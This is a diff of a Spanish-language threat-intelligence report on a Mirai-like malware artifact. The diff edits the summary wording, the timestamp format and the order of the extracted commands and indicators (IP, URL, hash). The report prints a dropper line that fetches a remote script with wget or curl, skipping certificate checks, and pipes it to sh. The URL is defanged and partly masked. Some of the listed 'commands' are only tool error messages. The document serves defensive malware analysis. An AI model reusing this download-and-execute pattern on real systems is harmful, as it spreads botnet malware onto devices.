@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asociaron 7 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificaron 7 comandos observados o extraídos. Se identificaron 11 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:35:06+00:00`
+- **Registrado:** `2026-08-09T19:35:06.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -45,30 +46,30 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 ## 🖥️ Comandos observados / extraídos
 
 ```text
-[4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh
-[4lcurl: option -k not recognized
-[4lwget: invalid option -- 'no-check-certificate'
-curl: try 'curl --help' or 'curl --manual' for more information
 sshd:x:22:22:sshd:/var/empty:/bin/false
-Try `wget --help' for more options.
+[4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh
+[4lwget: invalid option -- 'no-check-certificate'
 Usage: wget [OPTION]... [URL]...
+Try `wget --help' for more options.
+[4lcurl: option -k not recognized
+curl: try 'curl --help' or 'curl --manual' for more information
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 217.60.195.XXX | static_analysis |
 | url | hxxps://217.60.195.XXX/sh | strings |
 | url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | 112e38beeeb3265e8a85c414412c9cb4d91df835363ad0d08233d6d72f500290 | static_analysis |
-| command | [4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh | strings |
-| command | [4lcurl: option -k not recognized | strings |
-| command | [4lwget: invalid option -- 'no-check-certificate' | strings |
-| command | curl: try 'curl --help' or 'curl --manual' for more information | strings |
+| ip | 217.60.195.XXX | static_analysis |
 | command | sshd:x:22:22:sshd:/var/empty:/bin/false | strings |
-| command | Try `wget --help' for more options. | strings |
+| command | [4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh | strings |
+| command | [4lwget: invalid option -- 'no-check-certificate' | strings |
 | command | Usage: wget [OPTION]... [URL]... | strings |
+| command | Try `wget --help' for more options. | strings |
+| command | [4lcurl: option -k not recognized | strings |
+| command | curl: try 'curl --help' or 'curl --manual' for more information | strings |
+| hash | 112e38beeeb3265e8a85c414412c9cb4d91df835363ad0d08233d6d72f500290 | static_analysis |
 | ip | [internal-ip-redacted] | artifact_source |
 
 ## 🛡️ Nota de publicación
